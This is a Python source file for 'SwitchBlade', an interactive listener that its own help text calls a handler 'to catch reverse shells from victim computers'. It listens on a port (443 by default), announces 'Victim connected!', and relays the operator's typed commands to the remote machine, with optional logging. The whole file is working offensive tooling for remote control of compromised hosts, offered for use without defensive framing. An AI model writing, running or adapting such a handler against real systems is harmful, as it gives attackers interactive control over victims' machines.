#!/bin/env python3
# SwitchBlade - a python based TCP/IP handler for remote connections
# It's not as versatile as the Swiss-Army knife, but it's real good for stabbin'
# Author: Connor Gannon (Gin&Miskatonic)
# Init Date: 14 Nov 2018
#
import sys
import os
import argparse
import socket
import threading

import nclib
from prompt_toolkit import PromptSession
from prompt_toolkit.patch_stdout import patch_stdout

from nclib.errors import NetcatError, NetcatTimeout

class Switchblade:
	
	def __init__(self, port=443, sendLog=None, recvLog=None):
		self.port = port
		self.sendLog = sendLog
		self.recvLog = recvLog
		self.nc = nclib.Netcat(listen=('0.0.0.0',self.port), log_send=self.sendLog, log_recv=self.recvLog)
		print("Victim connected!")

	def runCommand(self, cmd):
		'''runCommand - executes a command based on str parameter and returns the result as a string'''
		proc = nclib.Process(cmd.split(' ')[0])
		proc.send(str.encode(' '.join(cmd.split(' ')[1:])))
	# can add support for piping here by writing a for loop that uses these connections to bounce data from one command to the next
		output = proc.recv().decode()
		proc.close()
		return output

	def builtins(self, cmd):
		print("There are no builtins.")

	def recv(self):
		while True:
			try:
				msg = self.nc.recv().decode().strip()
				if not msg:
					raise NetcatError
				print(msg)
			except (socket.error, NetcatError):
				print("recv machine broke.")

	def send(self,cmd):
		cmd = cmd+'\n'
		self.nc.send(str.encode(cmd))

	def listener(self):
		print ("Session starting...")
		self.session = PromptSession()
		recv_thread = threading.Thread(target=self.recv)
		recv_thread.daemon = True
		try:
			recv_thread.start()
			while True:
				with patch_stdout():
					cmd = self.session.prompt("$")
					if cmd == "bye netcat":
						break
					preface = cmd.split(':')[0]
					if preface == 'cmd':
						cmd = self.runCommand(':'.join(cmd.split(':')[1:]))
					elif preface == 'builtin':
						self.builtins(':'.join(cmd.split(':')[1:]))
						continue # builtins do not execute on victim side
					self.send(cmd)
		except (socket.error, NetcatError):
			print("send machine broke.")
		self.nc.close()

if __name__=="__main__":
	parser=argparse.ArgumentParser(description='A smart handler to catch reverse shells from victim computers.')
	parser.add_argument('-p', default=443, type=int, required=False, help="The port on which switchblade will listen")
	parser.add_argument('--send-log', type=str, required=False, help="A filepath to log connection information about output")
	parser.add_argument('--recv-log', type=str, required=False, help="A filepath to log information about input")
	args = parser.parse_args(sys.argv[1:])
	sb = Switchblade(args.p,args.send_log,args.recv_log)
	sb.listener()
